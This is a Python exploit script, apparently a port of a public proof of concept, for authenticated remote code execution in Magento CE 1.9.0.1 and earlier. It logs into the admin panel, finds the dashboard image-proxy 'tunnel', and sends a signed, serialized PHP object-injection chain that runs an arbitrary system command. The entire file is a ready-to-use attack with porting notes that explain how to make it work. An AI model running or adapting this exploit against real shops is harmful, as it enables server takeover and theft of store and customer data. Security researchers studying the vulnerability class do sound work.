#!/usr/bin/env python3
#
# Magento CE <= 1.9.0.1 - Authenticated Remote Code Execution
# -----------------------------------------------------------
# Python 3 port of Ebrietas0's 2015 PoC (originally EDB 37811).
#
# Original author : @Ebrietas0  (http://ebrietas0.blogspot.com)
# Py3 port + notes : l0lsuit
#
# WHAT THIS IS
#   The Magento admin "dashboard tunnel" (Google-graph image proxy) passes a
#   base64 `ga` parameter straight into PHP unserialize(). This script sends a
#   hand-built PHP object-injection POP chain:
#
#       Zend_Log -> Zend_Log_Writer_Mail -> Zend_Config_Writer_Yaml -> Varien_Object
#
#   On destruct the chain pivots into call_user_func(), letting us call an
#   arbitrary single-arg PHP function (system) with our command. It is the same
#   *class* of bug as any insecure-deserialization RCE: attacker data reaches a
#   gadget chain that ends in code execution.
#
# WHY A PORT WAS NEEDED (notes kept for anyone fixing the next 2015-era PoC)
#   * mechanize is a dead Py2 lib -> replaced with requests.Session()
#   * base64.b64encode / hashlib.md5 need BYTES in py3 -> .encode()/.decode()
#   * regex literals -> raw strings to kill SyntaxWarning on '\?'
#   * INSTALL_DATE must match /app/etc/local.xml EXACTLY (byte-for-byte): the
#     tunnel validates h = md5(base64(payload) + install_date). Wrong date =
#     silent failure.
#   * TARGET must be the admin path (…/index.php/admin), NOT the storefront
#     root, or you authenticate against the shop frontend and never see the
#     dashboard (no ajaxBlockUrl -> the first regex returns None).
#
# USAGE
#   python3 magento_1.9_authrce.py <admin_url> "<command>"
#   python3 magento_1.9_authrce.py http://target/index.php/admin "id"
#
#   Fill in USERNAME / PASSWORD (an admin you control) and INSTALL_DATE below.

from hashlib import md5
import sys
import re
import base64
import requests

# ---------------------------------------------------------------- config ----
USERNAME     = "CHANGE_ME"                              # admin user you control
PASSWORD     = "CHANGE_ME"                              # admin password
PHP_FUNCTION = "system"                                 # single-arg PHP fn to call
INSTALL_DATE = "CHANGE_ME_EXACT_FROM_local.xml"         # <install><date> value, EXACT


def build_payload(php_function, arg):
    """The PHP object-injection POP chain. %d/%s slots take the function name
    and the command, each length-prefixed as PHP serialization requires."""
    return (
        'O:8:"Zend_Log":1:{s:11:"\00*\00_writers";a:2:{i:0;O:20:'
        '"Zend_Log_Writer_Mail":4:{s:16:"\00*\00_eventsToMail";a:3:'
        '{i:0;s:11:"EXTERMINATE";i:1;s:12:"EXTERMINATE!";i:2;s:15:'
        '"EXTERMINATE!!!!";}s:22:"\00*\00_subjectPrependText";N;s:10:'
        '"\00*\00_layout";O:23:"Zend_Config_Writer_Yaml":3:{s:15:'
        '"\00*\00_yamlEncoder";s:%d:"%s";s:17:"\00*\00_loadedSection";N;'
        's:10:"\00*\00_config";O:13:"Varien_Object":1:{s:8:"\00*\00_data";'
        's:%d:"%s";}}s:8:"\00*\00_mail";O:9:"Zend_Mail":0:{}}i:1;i:2;}}'
        % (len(php_function), php_function, len(arg), arg)
    )


def main():
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <admin_url> \"<command>\"")
        print(f"Example: python3 {sys.argv[0]} http://target/index.php/admin \"id\"")
        sys.exit(1)

    target = sys.argv[1]
    command = sys.argv[2]

    if "CHANGE_ME" in (USERNAME, PASSWORD, INSTALL_DATE):
        print("[-] Edit USERNAME / PASSWORD / INSTALL_DATE at the top of the script first.")
        sys.exit(1)

    s = requests.Session()

    # 1) GET the admin login page (seeds the session cookie, exposes form_key)
    login_page = s.get(target).text
    fk = re.search(r'name="form_key"[^>]*value="([^"]+)"', login_page)
    login_data = {"login[username]": USERNAME, "login[password]": PASSWORD}
    if fk:
        login_data["form_key"] = fk.group(1)

    # 2) POST credentials -> should land on the dashboard
    content = s.post(target, data=login_data).text
    if "ajaxBlockUrl" not in content:
        title = re.search(r"<title>(.*?)</title>", content)
        print("[-] Login failed - not on the dashboard "
              f"(title: {title.group(1) if title else '?'}).")
        print("    Check creds, and that <admin_url> is the /index.php/admin path.")
        sys.exit(1)
    print("[+] Authenticated to admin dashboard.")

    # 3) pull the ajax block base URL and the form key from the dashboard
    ajax = re.search(r"ajaxBlockUrl = '(.*)'", content).group(1)
    key = re.search(r"var FORM_KEY = '(.*)'", content).group(1)

    # 4) request a dashboard block that renders the Google-graph "tunnel" URL
    block = s.post(ajax + "block/tab_orders/period/7d/?isAjax=true",
                   data={"isAjax": "false", "form_key": key}).text
    tunnel = re.search(r'src="(.*)\?ga=', block).group(1)
    print(f"[+] Tunnel endpoint: {tunnel}")

    # 5) base64 the POP chain and sign it the way the tunnel expects
    payload = build_payload(PHP_FUNCTION, command)
    payload_b64 = base64.b64encode(payload.encode()).decode()
    h = md5((payload_b64 + INSTALL_DATE).encode()).hexdigest()

    # 6) fire: unserialize() runs the chain -> system(command)
    exploit_url = f"{tunnel}?ga={payload_b64}&h={h}"
    print(f"[*] Executing: {command}\n")
    try:
        print(s.get(exploit_url).text)
    except requests.RequestException as e:
        print(f"[-] Request error: {e}")


if __name__ == "__main__":
    main()
